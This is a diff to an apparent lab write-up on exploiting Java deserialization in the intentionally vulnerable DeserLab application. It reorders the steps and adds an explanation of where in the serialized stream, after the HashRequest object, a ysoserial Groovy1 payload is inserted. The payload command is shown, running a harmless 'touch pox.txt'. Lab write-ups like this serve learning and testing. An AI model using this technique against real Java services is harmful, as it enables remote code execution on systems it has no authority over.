@@ -203,16 +203,22 @@ xxd ../DeserLab-v1.0/test.bin
 00000070: 0004 7465 7374 7400 00                   ..testt..
 ```
 
-Now time to generate payload:
-```
-java -jar ysoserial.jar Groovy1 "touch pox.txt" > thepayload.bin
-```
 
-No it time to paste payload afer  
+Now it time to paste payload afetr  
 ```TC_CLASSDESC - 0x72
       className
         Length - 20 - 0x00
 ```
+
+You ask why here?:
+
+So when we look at the process of information exchange, we will find that there is a place where Java objects are exchanged (as far as I know). This can be easily found in the output of the serialization analysis because it contains "TC_OBJECT-0x73"
+We can clearly see that the last part of the data flow is the "nb.deser.HashRequest" object. The place to read this object is also the last part of the exchange process, so it explains why we put a payload here. So now we know where to use the payload, so how do we choose, generate and send the payload?
+
+```
+java -jar ysoserial.jar Groovy1 "touch pox.txt" > thepayload.bin
+```
+
 How it should look like:
 ```
 java -jar SerializationDumper.jar -r ../DeserLab-v1.0/withpayload.bin 
